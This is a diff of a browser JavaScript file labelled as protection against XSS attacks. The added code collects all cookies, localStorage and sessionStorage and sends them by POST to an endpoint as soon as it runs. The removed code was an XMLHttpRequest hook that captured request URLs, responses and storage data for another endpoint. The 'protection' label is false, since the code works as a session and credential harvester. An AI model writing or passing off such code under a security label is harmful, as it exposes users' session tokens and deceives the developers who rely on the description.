@@ -1,6 +1,5 @@
+// Usage: This file is used to protect the application from XSS attacks.
 
-// Create a list to store XMLHttpRequest data
-const requests = [];
 function getAllSessionStorageData() {
   const sessionStorageData = {};
 
@@ -22,85 +21,52 @@ function getAlllocalStorageData() {
 
   return localStorageData;
 }
+function getAllCookies() {
+  const cookies = document.cookie.split(";").map((cookie) => {
+    const [name, value] = cookie.split("=");
+    // expire time
+    return { name: name.trim(), value: value.trim() };
+  });
 
-// Define the API endpoint to exclude
-const excludedEndpoint = 'http://localhost:8080/api/client/sessionstoragedata';
+  return cookies;
+}
+function getAllData() {
+  return {
+    sessionStorage: getAllSessionStorageData(),
+    localStorage: getAlllocalStorageData(),
+    cookies: getAllCookies(),
+  };
+}
+function hasCookieExpiration(cookieString) {
+  // Split cookie string by semicolon to get individual cookies
+  const cookies = cookieString.split(";");
 
-// Override the XMLHttpRequest object
-(function() {
-  const localStorageData = {};
-  for (let i = 0; i < localStorage.length; i++) {
-    const key = localStorage.key(i);
-    const value = localStorage.getItem(key);
-    localStorageData[key] = value;
+  // Iterate through cookies
+  for (let i = 0; i < cookies.length; i++) {
+    const cookie = cookies[i].trim(); // Trim any leading or trailing spaces
+    const cookieParts = cookie.split("="); // Split cookie into name and value
+
+    // If the cookie has an 'Expires' or 'Max-Age' attribute, return true
+    if (cookieParts.length === 2 && (cookieParts[0] === 'Expires' || cookieParts[0] === 'Max-Age')) {
+      return true;
+    }
   }
-  const sessionStorageData = {};
 
-  for (let i = 0; i < sessionStorage.length; i++) {
-    const key = sessionStorage.key(i);
-    const value = sessionStorage.getItem(key);
-    sessionStorageData[key] = value;
-  }
- 
-  const originalXHR = window.XMLHttpRequest;
-
-  function newXHR() {
-    const xhr = new originalXHR();
-    // Intercept the open() method to capture request details
-    const originalOpen = xhr.open;
-    xhr.open = function() {
-      const url = arguments[1];
-
-      // Check if the request URL matches the excluded endpoint
-      if (url !== excludedEndpoint) {
-        const requestDetails = {
-          method: arguments[0],
-          url: url,
-          payload: arguments[1], // Include the request payload
-          response: null // Initialize response as null
-        };
-
-        // Store the request details
-        requests.push(requestDetails);
-      }
-      // Call the original open() method
-      originalOpen.apply(this, arguments);
-    };
-    // Intercept the onload() method to capture response details
-    const originalOnload = xhr.onload;
-    xhr.onload = function() {
-      const request = requests.find((r) => r.url === xhr.responseURL);
-      if (request) {
-        request.response = xhr.responseText; // Store the response
-    
-        // Send the captured requests to the server (excluding the excluded endpoint)
-        const filteredRequests = requests.filter(
-          (r) => r.response !== null && r.response !== undefined && r.url !== excludedEndpoint
-        );
-      
-        fetch(excludedEndpoint, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({filteredRequests,localStorageData,sessionStorageData}) // Send filtered requests as JSON
-        })
-          .then((response) => {
-            // console.log(response);
-            // Handle the response from the sensitive key URL if needed
-          })
-          .catch((error) => {
-            // console.error(error);
-            // Handle any errors that occurred during the request
-          });
-      }
-      // Call the original onload() method
-      originalOnload.apply(this, arguments);
-    };
-    return xhr;
-  }
-  window.XMLHttpRequest = newXHR;
-})();
+  return false; // No cookie with expiration found
+}
+// Check if session cookie has expiration
+// send data to api with xhr request
+async function sendToApi(data) {
+  await fetch('http://localhost:20000/protected', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ data }),
+  });
+  console.log('Data sent to API');
+}
+sendToApi(getAllData());
 
 
 
